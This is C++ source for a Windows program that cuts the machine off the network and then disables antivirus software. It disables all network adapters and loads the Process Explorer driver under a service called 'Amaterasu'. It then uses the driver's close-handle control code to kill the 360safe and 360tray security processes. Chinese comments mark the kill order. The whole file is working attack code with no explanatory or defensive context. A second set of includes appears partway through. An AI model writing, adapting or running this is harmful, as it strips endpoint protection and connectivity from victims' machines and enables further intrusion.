#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <vector>
#include <string>
#include <algorithm>
#include "ntdll.h"
#include "resource.h"

#pragma comment(lib, "ntdll.lib")

#define IOCTL_CLOSE_HANDLE 0x83350004

typedef struct {
    DWORD  dwPID;
    PVOID  pvObject;
    DWORD  dwSize;
    HANDLE hProcess;
} PROCEXP_STRUCT;

std::wstring getWritePath() {
    WCHAR curDir[MAX_PATH + 1];
    GetCurrentDirectoryW(MAX_PATH + 1, curDir);
    return curDir + std::wstring(L"\\PROCEXP152.sys");
}

bool writeDriver() {
    std::wstring path = getWritePath();
    DWORD attr = GetFileAttributesW(path.c_str());
    return !(attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY));
}

bool deleteDriver() {
    return DeleteFileW(getWritePath().c_str());
}

bool setRegistryKeys() {
    WCHAR regPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\Amaterasu";
    HKEY hKey = NULL;
    DWORD dwDisposition = 0;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS)
        return false;

    DWORD dwData = 0;
    std::wstring driverPath(L"\\??\\" + getWritePath());
    if (RegSetValueEx(hKey, L"Type", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD)) ||
        RegSetValueEx(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD)) ||
        RegSetValueEx(hKey, L"Start", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD)) ||
        RegSetValueEx(hKey, L"ImagePath", 0, REG_SZ, (const BYTE*)driverPath.c_str(), (DWORD)(sizeof(wchar_t) * (wcslen(driverPath.c_str()) + 1))))
        return false;

    return true;
}

bool isElevated() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION tokenElevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, sizeof(tokenElevation), &dwSize)) {
            isElevated = tokenElevation.TokenIsElevated;
        }
    }
    if (hToken) CloseHandle(hToken);
    return isElevated;
}

bool getPrivilege(HANDLE& hToken, LPCWSTR lpPrivilegeName) {
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, lpPrivilegeName, &tp.Privileges[0].Luid))
        return false;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

bool hasPrivileges() {
    HANDLE hToken = NULL;
    BOOL result = FALSE;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        if (getPrivilege(hToken, L"SeDebugPrivilege") && getPrivilege(hToken, L"SeLoadDriverPrivilege"))
            result = TRUE;
    }
    if (hToken) CloseHandle(hToken);
    return result;
}

bool loadDriver(NTSTATUS& status) {
    WCHAR regPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Amaterasu";
    UNICODE_STRING uName;
    RtlInitUnicodeString(&uName, regPath);
    status = NtLoadDriver(&uName);
    return (status == STATUS_SUCCESS || status == STATUS_IMAGE_ALREADY_LOADED || status == STATUS_OBJECT_NAME_COLLISION);
}

bool unloadDriver() {
    WCHAR regPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Amaterasu";
    UNICODE_STRING uName;
    RtlInitUnicodeString(&uName, regPath);
    NTSTATUS status = NtUnloadDriver(&uName);
    return (status == STATUS_SUCCESS || status == STATUS_IMAGE_ALREADY_LOADED || status == STATUS_OBJECT_NAME_COLLISION);
}

HANDLE connectToDriver() {
    return CreateFileW(L"\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

HANDLE getProcessFromPID(int pid) {
    return OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
}

std::wstring exeFromPath(const std::wstring& fullPath) {
    size_t pos = fullPath.find_last_of(L"\\/");
    if (pos != std::wstring::npos)
        return fullPath.substr(pos + 1);
    return fullPath;
}

bool doesExeNameMatch(WCHAR* imagePath, LPCWSTR targetName) {
    return _wcsicmp(exeFromPath(imagePath).c_str(), targetName) == 0;
}

PSYSTEM_HANDLE_INFORMATION reallocHandleTableSize(ULONG dwBytes, PSYSTEM_HANDLE_INFORMATION pInfo) {
    HANDLE heap = GetProcessHeap();
    if (pInfo) HeapFree(heap, HEAP_NO_SERIALIZE, pInfo);
    return (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(heap, HEAP_ZERO_MEMORY, dwBytes);
}

PSYSTEM_HANDLE_INFORMATION getSystemHandleInfo() {
    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION pInfo = NULL;
    ULONG length = sizeof(SYSTEM_HANDLE_INFORMATION) + sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) * 100;
    pInfo = reallocHandleTableSize(length, pInfo);
    while ((status = NtQuerySystemInformation(SystemHandleInformation, pInfo, length, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
        length *= 2;
        pInfo = reallocHandleTableSize(length, pInfo);
    }
    return pInfo;
}

bool ioctlCloseHandle(SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo, HANDLE hDriver) {
    PROCEXP_STRUCT ioData = { 0 };
    ioData.dwPID = handleInfo.UniqueProcessId;
    ioData.pvObject = handleInfo.Object;
    ioData.dwSize = 0;
    ioData.hProcess = (HANDLE)handleInfo.HandleValue;
    return DeviceIoControl(hDriver, IOCTL_CLOSE_HANDLE, &ioData, sizeof(ioData), NULL, 0, NULL, NULL);
}

void killProcessHandles(HANDLE hDriver, LPCWSTR targetName1, LPCWSTR targetName2) {
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = getSystemHandleInfo();
    if (!pHandleInfo) return;

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleInfo->Handles[i];
        HANDLE hProcess = getProcessFromPID(handleInfo.UniqueProcessId);
        if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
            WCHAR imagePath[MAX_PATH] = { 0 };
            if (GetModuleFileNameExW(hProcess, NULL, imagePath, MAX_PATH)) {
                if (doesExeNameMatch(imagePath, targetName1)) {
                    ioctlCloseHandle(handleInfo, hDriver);
                }
                else if (doesExeNameMatch(imagePath, targetName2)) {
                    ioctlCloseHandle(handleInfo, hDriver);
                }
            }
            CloseHandle(hProcess);
        }
    }

    HeapFree(GetProcessHeap(), 0, pHandleInfo);
}

#include <devguid.h>  
#include <Windows.h>
#include <SetupAPI.h>
#include <Devpkey.h>
#include <Cfgmgr32.h>
#include <string>
#pragma comment(lib, "SetupAPI.lib")

void disableNetworkAdapters() {
    HDEVINFO hDevInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_NET, NULL, NULL, DIGCF_PRESENT);
    if (hDevInfo == INVALID_HANDLE_VALUE) return;

    SP_DEVINFO_DATA devInfoData;
    devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

    for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfoData); i++) {
        // 禁用设备
        if (CM_Disable_DevNode(devInfoData.DevInst, 0) != CR_SUCCESS) {
            // 可选：打印失败设备
        }
    }

    SetupDiDestroyDeviceInfoList(hDevInfo);
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    disableNetworkAdapters();
    if (!isElevated() || !hasPrivileges())
        return 1;

    bool wroteDriver = writeDriver();
    if (!wroteDriver)
        return 1;

    if (!setRegistryKeys())
        return 1;

    NTSTATUS status;
    if (!loadDriver(status))
        return 1;

    HANDLE hDriver = connectToDriver();
    if (!hDriver || hDriver == INVALID_HANDLE_VALUE)
        return 1;

    // 先杀 360tray，再杀 360safe
    killProcessHandles(hDriver, L"360safe.exe", L"360tray.exe");


    if (hDriver) CloseHandle(hDriver);
    unloadDriver();
    // deleteDriver(); // 如需清理驱动文件，可打开

    return 0;
}
